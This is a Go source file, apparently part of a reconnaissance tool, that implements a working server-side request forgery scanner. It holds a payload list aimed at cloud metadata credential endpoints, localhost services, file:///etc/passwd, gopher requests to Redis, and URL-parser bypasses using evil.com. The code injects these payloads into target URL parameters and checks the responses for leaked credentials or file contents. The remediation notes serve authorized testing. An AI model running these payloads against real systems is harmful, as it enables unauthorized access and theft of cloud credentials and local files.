package ssrf

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// SSRF payloads for testing
var ssrfPayloads = []struct {
	payload     string
	checkType   string
	description string
}{
	// Localhost variations
	{"http://127.0.0.1", "localhost", "Direct localhost access"},
	{"http://localhost", "localhost", "Localhost keyword"},
	{"http://127.0.0.1:80", "localhost", "Localhost with port 80"},
	{"http://127.0.0.1:443", "localhost", "Localhost with port 443"},
	{"http://127.0.0.1:22", "localhost", "Localhost SSH port"},
	{"http://127.0.0.1:3306", "localhost", "Localhost MySQL port"},
	{"http://127.0.0.1:6379", "localhost", "Localhost Redis port"},

	// IPv6 localhost
	{"http://[::1]", "localhost", "IPv6 localhost"},
	{"http://[0000::1]", "localhost", "IPv6 localhost expanded"},

	// Decimal IP
	{"http://2130706433", "localhost", "Decimal IP (127.0.0.1)"},
	{"http://017700000001", "localhost", "Octal IP (127.0.0.1)"},
	{"http://0x7f000001", "localhost", "Hex IP (127.0.0.1)"},

	// URL encoding bypass
	{"http://127.0.0.1%00", "localhost", "Null byte bypass"},
	{"http://127.0.0.1%0d%0a", "localhost", "CRLF bypass"},

	// Cloud metadata endpoints
	{"http://169.254.169.254/latest/meta-data/", "cloud", "AWS metadata"},
	{"http://169.254.169.254/latest/user-data/", "cloud", "AWS user-data"},
	{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "cloud", "AWS IAM credentials"},
	{"http://metadata.google.internal/computeMetadata/v1/", "cloud", "GCP metadata"},
	{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "cloud", "Azure metadata"},
	{"http://100.100.100.200/latest/meta-data/", "cloud", "Alibaba Cloud metadata"},
	{"http://169.254.170.2/v1/credentials", "cloud", "AWS ECS credentials"},

	// Internal network
	{"http://192.168.0.1", "internal", "Internal network 192.168.x.x"},
	{"http://192.168.1.1", "internal", "Internal network 192.168.x.x"},
	{"http://10.0.0.1", "internal", "Internal network 10.x.x.x"},
	{"http://172.16.0.1", "internal", "Internal network 172.16.x.x"},

	// File protocol
	{"file:///etc/passwd", "file", "Local file read"},
	{"file:///c:/windows/win.ini", "file", "Windows local file read"},

	// Other protocols
	{"gopher://127.0.0.1:6379/_", "gopher", "Gopher protocol (Redis)"},
	{"dict://127.0.0.1:6379/info", "dict", "Dict protocol"},
	{"ftp://127.0.0.1", "ftp", "FTP protocol"},

	// DNS rebinding (would need actual DNS server)
	// {"http://ssrf.example.com", "dns", "DNS rebinding"},

	// URL parser confusion
	{"http://evil.com#@127.0.0.1", "bypass", "Fragment bypass"},
	{"http://evil.com?@127.0.0.1", "bypass", "Query bypass"},
	{"http://127.0.0.1:80#@evil.com", "bypass", "Fragment after port"},
	{"http://127.0.0.1\\@evil.com", "bypass", "Backslash bypass"},
}

// Scan performs SSRF scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	client := utils.HTTPClient(cfg.Timeout, cfg.Proxy, false)
	sem := make(chan struct{}, cfg.Threads)

	// Filter URLs that might have SSRF-prone parameters
	ssrfParams := []string{
		"url", "uri", "path", "dest", "redirect", "out", "view",
		"file", "document", "folder", "root", "dir", "pg", "page",
		"target", "site", "src", "source", "host", "domain",
		"data", "load", "read", "fetch", "req", "request", "link",
		"img", "image", "pdf", "include", "require",
	}

	for _, urlStr := range urls {
		if !utils.HasParam(urlStr) {
			continue
		}

		parsedURL, err := url.Parse(urlStr)
		if err != nil {
			continue
		}

		params := parsedURL.Query()
		hasSSRFParam := false
		for param := range params {
			paramLower := strings.ToLower(param)
			for _, ssrfParam := range ssrfParams {
				if strings.Contains(paramLower, ssrfParam) {
					hasSSRFParam = true
					break
				}
			}
		}

		if !hasSSRFParam {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testSSRF(u, client, cfg)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testSSRF(urlStr string, client *http.Client, cfg *config.Config) []types.VulnResult {
	var results []types.VulnResult

	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return nil
	}

	params := parsedURL.Query()

	for param := range params {
		for _, test := range ssrfPayloads {
			result := testPayload(urlStr, param, test.payload, test.checkType, test.description, client)
			if result != nil {
				results = append(results, *result)
				break // Found SSRF for this param
			}
		}
	}

	return results
}

func testPayload(urlStr, param, payload, checkType, description string, client *http.Client) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()

	testParams := url.Values{}
	for k, v := range originalParams {
		testParams[k] = v
	}
	testParams.Set(param, payload)

	parsedURL.RawQuery = testParams.Encode()
	testURL := parsedURL.String()

	start := time.Now()
	resp, err := client.Get(testURL)
	responseTime := time.Since(start)

	if err != nil {
		// Some errors might indicate SSRF (connection refused to internal, etc.)
		if strings.Contains(err.Error(), "connection refused") && checkType == "localhost" {
			return &types.VulnResult{
				Type:        "Server-Side Request Forgery (SSRF)",
				Severity:    "high",
				URL:         urlStr,
				Parameter:   param,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Connection refused error suggests internal request attempt. Error: %v", err),
				Description: description,
				Remediation: "Validate and sanitize all URLs. Use allowlists for permitted domains. Block requests to internal IPs and cloud metadata endpoints.",
				References: []string{
					"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
					"https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
				},
			}
		}
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	// Check for cloud metadata indicators
	if checkType == "cloud" {
		cloudIndicators := []string{
			"ami-id", "instance-id", "security-credentials", // AWS
			"computeMetadata", "google", // GCP
			"azEnvironment", "vmId", // Azure
		}
		for _, indicator := range cloudIndicators {
			if strings.Contains(bodyStr, indicator) {
				return &types.VulnResult{
					Type:        "Server-Side Request Forgery (SSRF) - Cloud Metadata Access",
					Severity:    "critical",
					URL:         urlStr,
					Parameter:   param,
					Payload:     payload,
					Evidence:    fmt.Sprintf("Cloud metadata content found: %s", truncate(bodyStr, 500)),
					Description: description + " - CRITICAL: Cloud credentials may be exposed!",
					Remediation: "Block access to cloud metadata endpoints (169.254.169.254, etc.). Use IMDSv2 on AWS.",
					References: []string{
						"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
						"https://cloud.google.com/compute/docs/metadata/overview",
					},
				}
			}
		}
	}

	// Check for localhost indicators
	if checkType == "localhost" {
		localhostIndicators := []string{
			"root:", "/bin/bash", // Linux /etc/passwd
			"[extensions]", "[fonts]", // Windows win.ini
			"localhost", "127.0.0.1",
			"ssh", "mysql", "redis", "nginx", "apache",
		}
		for _, indicator := range localhostIndicators {
			if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(indicator)) {
				return &types.VulnResult{
					Type:        "Server-Side Request Forgery (SSRF)",
					Severity:    "high",
					URL:         urlStr,
					Parameter:   param,
					Payload:     payload,
					Evidence:    fmt.Sprintf("Localhost content indicator found: %s", truncate(bodyStr, 500)),
					Description: description,
					Remediation: "Validate and sanitize all URLs. Block requests to localhost and internal IPs.",
					References: []string{
						"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
					},
				}
			}
		}
	}

	// Check for file read
	if checkType == "file" {
		if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "[extensions]") {
			return &types.VulnResult{
				Type:        "Server-Side Request Forgery (SSRF) - Local File Read",
				Severity:    "critical",
				URL:         urlStr,
				Parameter:   param,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Local file content: %s", truncate(bodyStr, 500)),
				Description: description,
				Remediation: "Disable file:// protocol handling. Validate URL schemes to only allow http/https.",
				References: []string{
					"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
				},
			}
		}
	}

	// Check response time for blind SSRF
	if responseTime > 5*time.Second && (checkType == "internal" || checkType == "localhost") {
		return &types.VulnResult{
			Type:        "Server-Side Request Forgery (SSRF) - Possible Blind",
			Severity:    "medium",
			URL:         urlStr,
			Parameter:   param,
			Payload:     payload,
			Evidence:    fmt.Sprintf("Slow response time (%v) may indicate internal network access", responseTime),
			Description: "Possible blind SSRF detected based on response time",
			Remediation: "Validate and sanitize all URLs. Use allowlists for permitted domains.",
			References: []string{
				"https://portswigger.net/web-security/ssrf/blind",
			},
		}
	}

	return nil
}

func truncate(s string, maxLen int) string {
	if len(s) > maxLen {
		return s[:maxLen] + "..."
	}
	return s
}
